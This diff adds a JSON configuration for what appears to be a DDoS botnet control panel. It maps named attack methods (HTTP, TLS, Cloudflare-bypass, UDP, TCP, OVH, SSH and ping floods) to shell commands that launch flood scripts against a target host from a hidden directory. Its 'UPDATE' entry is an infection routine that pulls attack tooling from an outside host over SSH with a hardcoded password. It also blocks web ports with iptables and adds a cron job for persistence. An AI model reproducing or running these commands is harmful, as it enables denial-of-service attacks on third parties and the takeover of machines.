@@ -1,0 +1,95 @@
+[
+    {
+        "methods": "FLOOD",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node hybrid [HOST] [TIME] 4 50 proxy.txt'"
+    },
+    {
+        "methods": "TLSV3",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node tls3 GET [HOST] [TIME] 4 50 proxy.txt'"
+    },
+    {
+        "methods": "ULTRA-FLOOD",
+        "command": "cd /var/.trash/private && screen -dm timeout 9999999999 /root/.nvm/versions/node/v22.8.0/bin/node ULTRA-FLOOD [HOST] 50 4 50 proxy.txt'"
+    },
+    {
+        "methods": "SUPER-FLOOD",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node SUPER-FLOOD [HOST] [TIME] 50 4 proxy.txt'"
+    },
+    {
+        "methods": "HTTP-X",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node HTTP-X [HOST] [TIME] 50 4 proxy.txt'"
+    },
+    {
+        "methods": "BYPASS-R2",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node r2 [HOST] [TIME] 50 4 proxy.txt --input bypass'"
+    },
+    {
+        "methods": "FLOOD-PANEL",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node flood [HOST] [TIME]'"
+    },
+    {
+        "methods": "KILLER",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node CLOUDFLARE.js [HOST] [TIME] 50 4'"
+    },
+    {
+        "methods": "STRIKE",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node strike GET [HOST] [TIME] 4 50 proxy.txt'"
+    },
+    {
+        "methods": "NINJA",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node ninja.js [HOST] [TIME]'"
+    },
+    {
+        "methods": "RAW",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node raw.js [HOST] [TIME]'"
+    },
+    {
+        "methods": "KILL-SSH",
+        "command": "cd /var/.trash/private && tmux new-session -d 'node ssh.js [HOST] [PORT] root [TIME]'"
+    },
+    {
+        "methods": "TLS",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node tls.js [HOST] [TIME] 50 4 proxy.txt'"
+    },
+    {
+        "methods": "BYPASS",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node bypass.js [HOST] [TIME] 50 50 proxy.txt'"
+    },
+    {
+        "methods": "TCP",
+        "command": "cd /var/.trash/private && tmux new-session -d 'bash TCP.sh [HOST] [PORT] [TIME]'"
+    },
+    {
+        "methods": "UDP",
+        "command": "cd /var/.trash/private && tmux new-session -d 'bash UDP.sh [HOST] [PORT] [TIME]'"
+    },
+    {
+        "methods": "OVH",
+        "command": "cd /var/.trash/private && tmux new-session -d './OVH STD [HOST] [PORT] [TIME]'"
+    },
+    {
+        "methods": "KILL-PING",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node ping.js [HOST] 65507 6 1 [TIME]'"
+    },
+    {
+        "methods": "STATIC",
+        "command": "cd /var/.trash/private && ./skid [HOST] [TIME] 1000 GET'"
+    },
+    {
+        "methods": "PROXY",
+        "command": "cd /var/.trash/private && tmux new-session -d '/root/.nvm/versions/node/v22.8.0/bin/node proxy.js && /root/.nvm/versions/node/v22.8.0/bin/node uagen.js 100 ua.txt'"
+    },
+    {
+        "methods": "REBOOT",
+        "command": "reboot'"
+    },
+    {
+        "methods": "STOP",
+        "command": "pkill screen; pkill tmux'"
+    },
+    {
+        "methods": "UPDATE",
+        "command": "tmux new-session -d 'export DEBIAN_FRONTEND=noninteractive && clear && echo -e \"\\e[1;31m\\n\\n\\n\\n\\nF Botnets Infection On This Device, Waiting...\\n\\n\\n\\n\\n\\e[0m\" && apt-get update -qq && apt-get upgrade -y -o Dpkg::Options::=\\\"--force-confnew\\\" && apt-get install -y python3 curl build-essential npm iptables sshpass --no-install-recommends && curl -sL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash && export NVM_DIR=\\\"$HOME/.nvm\\\" && [ -s \\\"$NVM_DIR/nvm.sh\\\" ] && . \\\"$NVM_DIR/nvm.sh\\\" && nvm install node && npm install -g npm@latest && sshpass -p 'kontol' scp -r -P 22 -o StrictHostKeyChecking=no root@play.f-network.my.id:/root/k/private ./ && cd private && npm install --silent && chmod -R 777 . && sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -j DROP && sudo iptables -A OUTPUT -p tcp -m multiport --sports 80,443 -j DROP && (crontab -l 2>/dev/null; echo \"*/5 * * * * cd /var/.trash/private && python3 scrape.py\") | crontab - && clear && echo -e \"\\e[1;32m\\n\\n\\n\\n\\nSUCCESS: F Botnets Infection Completed!\\n\\n\\n\\n\\n\\e[0m'\""
+    }
+]
+
